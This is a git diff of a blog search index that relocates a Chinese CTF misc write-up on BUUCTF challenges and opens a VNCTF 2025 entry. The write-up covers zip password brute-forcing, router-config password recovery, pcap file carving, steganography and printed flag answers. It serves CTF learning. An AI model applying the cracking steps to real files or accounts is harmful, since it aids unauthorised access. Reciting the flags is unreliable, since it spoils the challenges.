@@ -998,168 +998,6 @@ flag = long_to_bytes(m)
       </tags>
   </entry>
   <entry>
-    <title>BUU—MISC刷题记录</title>
-    <url>/2024/12/20/BUU%E2%80%94MISC%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<p>浅浅记录一下BUU里感觉比较有价值的题目</p>
-<h2 id="0荷兰宽带泄露"><a href="#0荷兰宽带泄露" class="headerlink" title="0荷兰宽带泄露"></a>0荷兰宽带泄露</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192240105.png" alt="image-20241207192240105"></p>
-<p>解压后发现一个bin文件，第一次碰到不知道怎么处理，看了一下别的师傅的wp了解到一种新的工具：<code>RouterPassView</code>(用于破解宽带数据文件的密码)，题目没有提示Flag</p>
-<p>那试试用户名<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192618872.png" alt="image-20241207192618872"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192553975.png" alt="image-20241207192553975"></p>
-<p>解压发现是<code>xls</code>文件,猜测是<code>xls</code>隐写</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193031701.png" alt="image-20241207193031701"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193626760.png" alt="image-20241207193626760"></p>
-<p>但是010一查发现有pk头,改后缀一查<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194005524.png" alt="image-20241207194005524"></p>
-<p><code>flag&#123;M9eVfi2Pcs#&#125;</code></p>
-<h2 id="1被劫持的神秘礼物"><a href="#1被劫持的神秘礼物" class="headerlink" title="1被劫持的神秘礼物"></a>1被劫持的神秘礼物</h2><p>下载是一个流量文件，结合标题应该是流量劫持</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194738383.png" alt="image-20241207194738383"></p>
-<p>主要是HTTP流量，直接追踪流</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194834914.png" alt="image-20241207194834914"></p>
-<p>用<code>captfencoder</code>MD5一下结束战斗</p>
-<p><code>flag&#123;1d240aafe21a86afc11f38a45b541a49&#125;</code></p>
-<h2 id="2被偷走的文件1"><a href="#2被偷走的文件1" class="headerlink" title="2被偷走的文件1"></a>2被偷走的文件1</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207195352502.png" alt="image-20241207195352502"></p>
-<p>用<code>foremost</code>分离，解压需要密码，先确定流量中没有藏密码，再暴力破解</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200247505.png" alt="image-20241207200247505"></p>
-<p><code>flag&#123;6fe99a5d03fb01f833ec3caa80358fa3&#125;</code></p>
-<h2 id="3藏藏藏"><a href="#3藏藏藏" class="headerlink" title="3藏藏藏"></a>3藏藏藏</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200530486.png" alt="image-20241207200530486"></p>
-<p>看到图片结合题目名，感觉图片隐写或者图片里包含文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200653951.png" alt="image-20241207200653951"></p>
-<p>顺利分离出一个压缩包，打开是一个docx文件，隐写无疑了</p>
-<p>然而里面是一个二维码（扫兴啊），直接扫就出来了</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201042011.png" alt="image-20241207201042011"></p>
-<h2 id="4佛系青年"><a href="#4佛系青年" class="headerlink" title="4佛系青年"></a>4佛系青年</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201306534.png" alt="image-20241207201306534"></p>
-<p>解压文档需要密码，有一张<code>png</code>是可以查看的，先010查一下</p>
-<p>查完没有藏文件，那应该就是隐写了</p>
-<p>结果没有发现隐写，感觉被骗了</p>
-<p>看一眼压缩包，是伪加密（这里本来没看见的，后来仔细看才发现，也算学到一点分别伪加密的方法）</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204245901.png" alt="image-20241207204245901"></p>
-<p>改一下解压，文本里可以看到与佛论禅的加密，用一下随波逐流<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204051135.png" alt="image-20241207204051135"></p>
-<h2 id="5刷新过的图片"><a href="#5刷新过的图片" class="headerlink" title="5刷新过的图片"></a>5刷新过的图片</h2><p>附件是一张图片，提醒刷新，本来以为是什么操作，仔细想了以后是F5（刷新）隐写</p>
-<p>把项目git clone之后发现jdk17环境下运行直接报错，换jdk11看看<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164651743.png" alt="image-20241208164651743"></p>
-<p>成功了，打开提取的文件发现有PK头</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164742896.png" alt="image-20241208164742896"></p>
-<p>一开始尝试用复制粘贴的办法在010里重新新建一个文件，但是失败（报错需要分卷，猜测是复制粘贴的过程中有些字符无法被复制）<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165127780.png" alt="image-20241208165127780"></p>
-<p>那么直接改原文件后缀，压缩包是伪加密，手改或者随波逐流走一下结束</p>
-<p><code>flag&#123;96efd0a2037d06f34199e921079778ee&#125;</code></p>
-<h2 id="6秘密文件"><a href="#6秘密文件" class="headerlink" title="6秘密文件"></a>6秘密文件</h2><p>附件是流量，wireshark启动！</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165407266.png" alt="image-20241208165407266"></p>
-<p>foremost出一下，要密码，先尝试弱密码爆破</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165707184.png" alt="image-20241208165707184"></p>
-<p><code>flag&#123;d72e5a671aa50fa5f400e5d10eedeaa5&#125;</code></p>
-<h2 id="7你猜我是个啥"><a href="#7你猜我是个啥" class="headerlink" title="7你猜我是个啥"></a>7你猜我是个啥</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165810484.png" alt="image-20241208165810484"></p>
-<p>看来是改了后缀，010先查查看</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165945001.png" alt="image-20241208165945001"></p>
-<p>演都不演了…</p>
-<h2 id="8鸡你太美"><a href="#8鸡你太美" class="headerlink" title="8鸡你太美"></a>8鸡你太美</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208170109877.png" alt="image-20241208170109877"></p>
-<p>盯完帧没有东西，看看副本，发现已经损坏</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208172403139.png" alt="image-20241208172403139">用010一查是缺少文件头手动补上</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208171838407.png" alt="image-20241208171838407"></p>
-<p>（这里-其实是_）</p>
-<h2 id="9神奇的二维码"><a href="#9神奇的二维码" class="headerlink" title="9神奇的二维码"></a>9神奇的二维码</h2><p>附件是一张二维码，先扫扫看</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194745048.png" alt="image-20241208194745048"></p>
-<p>看来不在这里，用010查一下<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194925593.png" alt="image-20241208194925593"></p>
-<p>里面藏了文件，用 <code>binwalk</code>分离（foremost会分不出来）</p>
-<p>分出来四个包，分别解压<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208195041436.png" alt="image-20241208195041436"></p>
-<p>其中一个包解压是一张jpg和一个压缩包（内含一个同名jpg），有两种想法，一种是压缩可读图片为压缩包明文攻击（<code>crc</code>校验值相同），另一种就是暴力拆包</p>
-<p>先暴力拆包，结果显示不给拆<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208205419372.png" alt="image-20241208205419372"></p>
-<blockquote>
-<p>[!NOTE]</p>
-<p>以下为对题目考察的不是明文攻击的验证，可以跳过</p>
-</blockquote>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208200829953.png" alt="image-20241208200829953"></p>
-<p>初步看一下大小是一样的，那么直接查<code>crc</code>值</p>
-<p>这里我们用ubuntu查，使用<code>crc32</code>命令</p>
-<pre><code class="highlight bash"><span class="built_in">sudo</span> apt install libarchive-zip-perl
-crc32 flag.jpg</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208202527536.png" alt="image-20241208202527536"></p>
-<p>结合压缩包的crc<code>24A345DA</code>，得出不是明文攻击</p>
-<p>还是看看其他几个解压出来的东西吧<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203221291.png" alt="image-20241208203221291"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203324389.png" alt="image-20241208203324389"></p>
-<p>到目前为止没有什么用处，看看另一个加密的音频文件和docx文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203515033.png" alt="image-20241208203515033"></p>
-<p>这么长的base64还是要忍不住想是不是base64和图像之间的转换的，但是区区8k字符加上还有一个没有解压的包直接让我打消这个念头了，直接<code>basecrack</code>伺候</p>
-<pre><code class="highlight bash">python3 basecrack.py -m -f flag.txt</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204133481.png" alt="image-20241208204133481">解压之后，用Audacity看一下，一眼摩斯</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204450830.png" alt="image-20241208204450830"></p>
-<p>水平有限，还是手敲罢</p>
-<pre><code class="highlight plaintext">11 111 010 000 0 00 000 0001 0 010 1011 0001 0 010 1011 0 01 000 1011</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204944858.png" alt="image-20241208204944858">大写不对，换个小写</p>
-<p>鉴定为图片纯纯的诈骗（恼</p>
-<h2 id="10梅花香自苦寒来"><a href="#10梅花香自苦寒来" class="headerlink" title="10梅花香自苦寒来"></a>10梅花香自苦寒来</h2><p>附件是一张<code>png</code>，没有其他明显的提示，看一眼属性</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152723027.png" alt="image-20241209152723027"></p>
-<p>要画图，那么应该藏了坐标，010查一下</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152821648.png" alt="image-20241209152821648"></p>
-<p>可以看到文件尾藏了一种数据，接下来有两种方法</p>
-<blockquote>
-<p>随波逐流</p>
-</blockquote>
-<p>将文件拖入会自动提取并且解码，再用其内置的坐标画图最终得到一张反色的二维码</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209153156877.png" alt="image-20241209153156877"></p>
-<p>这个时候用<code>stegsolve</code>反色再扫就出来了</p>
-<blockquote>
-<p>脚本画图</p>
-</blockquote>
-<p>选首尾位置复制到记事本，复制到厨子再hex解码，得到一串坐标<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209154148273.png" alt="image-20241209154148273"></p>
-<p>贴到txt里，接下来就是画图，参考了别的师傅的wp,有两种做法</p>
-<p>​	<code>*gnuplot*</code>绘图</p>
-<p>贴个脚本先</p>
-<pre><code class="highlight plaintext">with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:  # 坐标格式文件比如(7,7)
-    re = res.read()
-    res.close()
-    
-with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:   # 将转换后的坐标写入gnuplotTxt.txt
-    re = re.split()
-    tem = &#x27;&#x27;
-    for i in range(0, len(re)):
-        tem = re[i]
-        tem = tem.lstrip(&#x27;(&#x27;)
-        tem = tem.rstrip(&#x27;)&#x27;)
-        for j in range(0, len(tem)):
-            if tem[j] == &#x27;,&#x27;:
-                tem = tem[:j] + &#x27; &#x27; + tem[j+1:]
-        gnup.write(tem + &#x27;\n&#x27;)
-    gnup.close()</code></pre>
-
-<p>得到去括号，去逗号的坐标值</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155236795.png" alt="image-20241209155236795"></p>
-<p>贴一下ubuntu下的下载和使用方法</p>
-<pre><code class="highlight bash"><span class="built_in">sudo</span> apt-get install gnuplot-x11
-gnuplot
-plot <span class="string">&quot;output.txt&quot;</span></code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155627592.png" alt="image-20241209155627592"></p>
-<p>可以扫出来</p>
-<p>​	<em>matplotlib</em>绘图</p>
-<p>把原文本去括号，用脚本跑</p>
-<pre><code class="highlight plaintext">import matplotlib.pyplot as plt
-import numpy as np
-with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:
-    re = res.read()
-    res.close()
-
-with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:  # 将转换后的坐标写入gnuplotTxt.txt
-    re = re.split()
-    tem = &#x27;&#x27;
-    for i in range(0, len(re)):
-        tem = re[i]
-        tem = tem.lstrip(&#x27;(&#x27;)
-        tem = tem.rstrip(&#x27;)&#x27;)
-        gnup.write(tem + &#x27;\n&#x27;)
-    gnup.close()
-x, y = np.loadtxt(&#x27;output.txt&#x27;, delimiter=&#x27;,&#x27;, unpack=True)
-plt.plot(x, y, &#x27;.&#x27;)
-plt.show()</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209162242387.png" alt="image-20241209162242387"></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HTML学习以及网页搭建初实践</title>
     <url>/2025/03/30/HTML%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E7%BD%91%E9%A1%B5%E6%90%AD%E5%BB%BA%E5%88%9D%E5%AE%9E%E8%B7%B5/</url>
     <content><![CDATA[<h1 id="HTML学习以及网页搭建初实践"><a href="#HTML学习以及网页搭建初实践" class="headerlink" title="HTML学习以及网页搭建初实践"></a>HTML学习以及网页搭建初实践</h1><p>学XSS一大家子时发现前端不仔细了解一下学习很难进行下去啊，于是就想先简单学习一下html来做一个铺垫</p>
@@ -2044,6 +1882,168 @@ plt.show()</code></pre>
 </script></td></tr></tbody></table>]]></content>
       <tags>
         <tag>-HTML -Web前端</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUU—MISC刷题记录</title>
+    <url>/2024/12/20/BUU%E2%80%94MISC%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<p>浅浅记录一下BUU里感觉比较有价值的题目</p>
+<h2 id="0荷兰宽带泄露"><a href="#0荷兰宽带泄露" class="headerlink" title="0荷兰宽带泄露"></a>0荷兰宽带泄露</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192240105.png" alt="image-20241207192240105"></p>
+<p>解压后发现一个bin文件，第一次碰到不知道怎么处理，看了一下别的师傅的wp了解到一种新的工具：<code>RouterPassView</code>(用于破解宽带数据文件的密码)，题目没有提示Flag</p>
+<p>那试试用户名<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192618872.png" alt="image-20241207192618872"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192553975.png" alt="image-20241207192553975"></p>
+<p>解压发现是<code>xls</code>文件,猜测是<code>xls</code>隐写</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193031701.png" alt="image-20241207193031701"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193626760.png" alt="image-20241207193626760"></p>
+<p>但是010一查发现有pk头,改后缀一查<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194005524.png" alt="image-20241207194005524"></p>
+<p><code>flag&#123;M9eVfi2Pcs#&#125;</code></p>
+<h2 id="1被劫持的神秘礼物"><a href="#1被劫持的神秘礼物" class="headerlink" title="1被劫持的神秘礼物"></a>1被劫持的神秘礼物</h2><p>下载是一个流量文件，结合标题应该是流量劫持</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194738383.png" alt="image-20241207194738383"></p>
+<p>主要是HTTP流量，直接追踪流</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194834914.png" alt="image-20241207194834914"></p>
+<p>用<code>captfencoder</code>MD5一下结束战斗</p>
+<p><code>flag&#123;1d240aafe21a86afc11f38a45b541a49&#125;</code></p>
+<h2 id="2被偷走的文件1"><a href="#2被偷走的文件1" class="headerlink" title="2被偷走的文件1"></a>2被偷走的文件1</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207195352502.png" alt="image-20241207195352502"></p>
+<p>用<code>foremost</code>分离，解压需要密码，先确定流量中没有藏密码，再暴力破解</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200247505.png" alt="image-20241207200247505"></p>
+<p><code>flag&#123;6fe99a5d03fb01f833ec3caa80358fa3&#125;</code></p>
+<h2 id="3藏藏藏"><a href="#3藏藏藏" class="headerlink" title="3藏藏藏"></a>3藏藏藏</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200530486.png" alt="image-20241207200530486"></p>
+<p>看到图片结合题目名，感觉图片隐写或者图片里包含文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200653951.png" alt="image-20241207200653951"></p>
+<p>顺利分离出一个压缩包，打开是一个docx文件，隐写无疑了</p>
+<p>然而里面是一个二维码（扫兴啊），直接扫就出来了</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201042011.png" alt="image-20241207201042011"></p>
+<h2 id="4佛系青年"><a href="#4佛系青年" class="headerlink" title="4佛系青年"></a>4佛系青年</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201306534.png" alt="image-20241207201306534"></p>
+<p>解压文档需要密码，有一张<code>png</code>是可以查看的，先010查一下</p>
+<p>查完没有藏文件，那应该就是隐写了</p>
+<p>结果没有发现隐写，感觉被骗了</p>
+<p>看一眼压缩包，是伪加密（这里本来没看见的，后来仔细看才发现，也算学到一点分别伪加密的方法）</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204245901.png" alt="image-20241207204245901"></p>
+<p>改一下解压，文本里可以看到与佛论禅的加密，用一下随波逐流<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204051135.png" alt="image-20241207204051135"></p>
+<h2 id="5刷新过的图片"><a href="#5刷新过的图片" class="headerlink" title="5刷新过的图片"></a>5刷新过的图片</h2><p>附件是一张图片，提醒刷新，本来以为是什么操作，仔细想了以后是F5（刷新）隐写</p>
+<p>把项目git clone之后发现jdk17环境下运行直接报错，换jdk11看看<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164651743.png" alt="image-20241208164651743"></p>
+<p>成功了，打开提取的文件发现有PK头</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164742896.png" alt="image-20241208164742896"></p>
+<p>一开始尝试用复制粘贴的办法在010里重新新建一个文件，但是失败（报错需要分卷，猜测是复制粘贴的过程中有些字符无法被复制）<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165127780.png" alt="image-20241208165127780"></p>
+<p>那么直接改原文件后缀，压缩包是伪加密，手改或者随波逐流走一下结束</p>
+<p><code>flag&#123;96efd0a2037d06f34199e921079778ee&#125;</code></p>
+<h2 id="6秘密文件"><a href="#6秘密文件" class="headerlink" title="6秘密文件"></a>6秘密文件</h2><p>附件是流量，wireshark启动！</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165407266.png" alt="image-20241208165407266"></p>
+<p>foremost出一下，要密码，先尝试弱密码爆破</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165707184.png" alt="image-20241208165707184"></p>
+<p><code>flag&#123;d72e5a671aa50fa5f400e5d10eedeaa5&#125;</code></p>
+<h2 id="7你猜我是个啥"><a href="#7你猜我是个啥" class="headerlink" title="7你猜我是个啥"></a>7你猜我是个啥</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165810484.png" alt="image-20241208165810484"></p>
+<p>看来是改了后缀，010先查查看</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165945001.png" alt="image-20241208165945001"></p>
+<p>演都不演了…</p>
+<h2 id="8鸡你太美"><a href="#8鸡你太美" class="headerlink" title="8鸡你太美"></a>8鸡你太美</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208170109877.png" alt="image-20241208170109877"></p>
+<p>盯完帧没有东西，看看副本，发现已经损坏</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208172403139.png" alt="image-20241208172403139">用010一查是缺少文件头手动补上</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208171838407.png" alt="image-20241208171838407"></p>
+<p>（这里-其实是_）</p>
+<h2 id="9神奇的二维码"><a href="#9神奇的二维码" class="headerlink" title="9神奇的二维码"></a>9神奇的二维码</h2><p>附件是一张二维码，先扫扫看</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194745048.png" alt="image-20241208194745048"></p>
+<p>看来不在这里，用010查一下<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194925593.png" alt="image-20241208194925593"></p>
+<p>里面藏了文件，用 <code>binwalk</code>分离（foremost会分不出来）</p>
+<p>分出来四个包，分别解压<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208195041436.png" alt="image-20241208195041436"></p>
+<p>其中一个包解压是一张jpg和一个压缩包（内含一个同名jpg），有两种想法，一种是压缩可读图片为压缩包明文攻击（<code>crc</code>校验值相同），另一种就是暴力拆包</p>
+<p>先暴力拆包，结果显示不给拆<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208205419372.png" alt="image-20241208205419372"></p>
+<blockquote>
+<p>[!NOTE]</p>
+<p>以下为对题目考察的不是明文攻击的验证，可以跳过</p>
+</blockquote>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208200829953.png" alt="image-20241208200829953"></p>
+<p>初步看一下大小是一样的，那么直接查<code>crc</code>值</p>
+<p>这里我们用ubuntu查，使用<code>crc32</code>命令</p>
+<pre><code class="highlight bash"><span class="built_in">sudo</span> apt install libarchive-zip-perl
+crc32 flag.jpg</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208202527536.png" alt="image-20241208202527536"></p>
+<p>结合压缩包的crc<code>24A345DA</code>，得出不是明文攻击</p>
+<p>还是看看其他几个解压出来的东西吧<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203221291.png" alt="image-20241208203221291"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203324389.png" alt="image-20241208203324389"></p>
+<p>到目前为止没有什么用处，看看另一个加密的音频文件和docx文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203515033.png" alt="image-20241208203515033"></p>
+<p>这么长的base64还是要忍不住想是不是base64和图像之间的转换的，但是区区8k字符加上还有一个没有解压的包直接让我打消这个念头了，直接<code>basecrack</code>伺候</p>
+<pre><code class="highlight bash">python3 basecrack.py -m -f flag.txt</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204133481.png" alt="image-20241208204133481">解压之后，用Audacity看一下，一眼摩斯</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204450830.png" alt="image-20241208204450830"></p>
+<p>水平有限，还是手敲罢</p>
+<pre><code class="highlight plaintext">11 111 010 000 0 00 000 0001 0 010 1011 0001 0 010 1011 0 01 000 1011</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204944858.png" alt="image-20241208204944858">大写不对，换个小写</p>
+<p>鉴定为图片纯纯的诈骗（恼</p>
+<h2 id="10梅花香自苦寒来"><a href="#10梅花香自苦寒来" class="headerlink" title="10梅花香自苦寒来"></a>10梅花香自苦寒来</h2><p>附件是一张<code>png</code>，没有其他明显的提示，看一眼属性</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152723027.png" alt="image-20241209152723027"></p>
+<p>要画图，那么应该藏了坐标，010查一下</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152821648.png" alt="image-20241209152821648"></p>
+<p>可以看到文件尾藏了一种数据，接下来有两种方法</p>
+<blockquote>
+<p>随波逐流</p>
+</blockquote>
+<p>将文件拖入会自动提取并且解码，再用其内置的坐标画图最终得到一张反色的二维码</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209153156877.png" alt="image-20241209153156877"></p>
+<p>这个时候用<code>stegsolve</code>反色再扫就出来了</p>
+<blockquote>
+<p>脚本画图</p>
+</blockquote>
+<p>选首尾位置复制到记事本，复制到厨子再hex解码，得到一串坐标<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209154148273.png" alt="image-20241209154148273"></p>
+<p>贴到txt里，接下来就是画图，参考了别的师傅的wp,有两种做法</p>
+<p>​	<code>*gnuplot*</code>绘图</p>
+<p>贴个脚本先</p>
+<pre><code class="highlight plaintext">with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:  # 坐标格式文件比如(7,7)
+    re = res.read()
+    res.close()
+    
+with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:   # 将转换后的坐标写入gnuplotTxt.txt
+    re = re.split()
+    tem = &#x27;&#x27;
+    for i in range(0, len(re)):
+        tem = re[i]
+        tem = tem.lstrip(&#x27;(&#x27;)
+        tem = tem.rstrip(&#x27;)&#x27;)
+        for j in range(0, len(tem)):
+            if tem[j] == &#x27;,&#x27;:
+                tem = tem[:j] + &#x27; &#x27; + tem[j+1:]
+        gnup.write(tem + &#x27;\n&#x27;)
+    gnup.close()</code></pre>
+
+<p>得到去括号，去逗号的坐标值</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155236795.png" alt="image-20241209155236795"></p>
+<p>贴一下ubuntu下的下载和使用方法</p>
+<pre><code class="highlight bash"><span class="built_in">sudo</span> apt-get install gnuplot-x11
+gnuplot
+plot <span class="string">&quot;output.txt&quot;</span></code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155627592.png" alt="image-20241209155627592"></p>
+<p>可以扫出来</p>
+<p>​	<em>matplotlib</em>绘图</p>
+<p>把原文本去括号，用脚本跑</p>
+<pre><code class="highlight plaintext">import matplotlib.pyplot as plt
+import numpy as np
+with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:
+    re = res.read()
+    res.close()
+
+with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:  # 将转换后的坐标写入gnuplotTxt.txt
+    re = re.split()
+    tem = &#x27;&#x27;
+    for i in range(0, len(re)):
+        tem = re[i]
+        tem = tem.lstrip(&#x27;(&#x27;)
+        tem = tem.rstrip(&#x27;)&#x27;)
+        gnup.write(tem + &#x27;\n&#x27;)
+    gnup.close()
+x, y = np.loadtxt(&#x27;output.txt&#x27;, delimiter=&#x27;,&#x27;, unpack=True)
+plt.plot(x, y, &#x27;.&#x27;)
+plt.show()</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209162242387.png" alt="image-20241209162242387"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
       </tags>
   </entry>
   <entry>
@@ -4255,6 +4255,128 @@ php &gt;</code></pre>
       </tags>
   </entry>
   <entry>
+    <title>VNCTF2025</title>
+    <url>/2025/02/10/VNCTF2025/</url>
+    <content><![CDATA[<h1 id="VNCTF-2025"><a href="#VNCTF-2025" class="headerlink" title="VNCTF 2025"></a>VNCTF 2025</h1><p>入坑CTF以来打过最难的个人赛，打完的表情就像先辈的一张表情包一样</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/e7584e8da9773912fec999bbbd198618347ae2dc.jpg" alt="img"></p>
+<p>比赛期间就出了一题，这才是正统misc吗哈哈(</p>
+<h2 id="VN-Lang"><a href="#VN-Lang" class="headerlink" title="VN_Lang"></a><strong>VN_Lang</strong></h2><p>不能较真的签到题，附件一个exe,一个莫名其妙的源代码。看起来花里胡哨，实际010一查就出来了</p>
